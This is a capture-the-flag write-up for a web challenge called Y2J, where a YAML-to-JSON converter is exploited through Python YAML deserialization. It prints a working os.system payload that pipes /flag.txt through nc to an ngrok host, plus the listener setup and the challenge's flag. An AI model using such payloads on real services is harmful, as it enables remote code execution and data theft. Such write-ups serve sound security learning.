## Name: Y2J
#### Author: @JohnHammond#6971
#### Category: Web
#### Difficulty: N/D
#### Description: Everyone was so worried about Y2K, but apparently it was a typo all along!!

The real world-ending fears were from Y2J!

Find the flag.txt file in the root of the filesystem.

## Procedure
The website convert Yaml file to Json, so this mean our vulnerability is about Yaml Deserialization, we can find some payloads at [hacktricks](https://book.hacktricks.xyz/pentesting-web/deserialization/python-yaml-deserialization)

After send the payload ```!!python3``` we can confirm the Yaml Deserialization vulnerability

<img width="1200" alt="Screenshot 2024-11-03 at 5 18 41 PM" src="https://github.com/user-attachments/assets/ac7f4824-57ff-442e-8868-3b3b64623645">


Open a new shell console ```nc -lnvp 1337``` and using ngrok ```./ngrok tcp 1337```, we send the following payload 

```
!!python/object/apply:os.system
args: ["cat /flag.txt |nc 2.tcp.ngrok.io 11855"]
```

then check our nc listening at 1337, and we can see our flag.

![Screenshot 2024-10-25 at 11 34 22 AM](https://github.com/user-attachments/assets/9752b547-e046-4b61-8221-c84ab3d422b3)


flag ```flag{b20870a1955ac22377045e3b2dcb832a}```
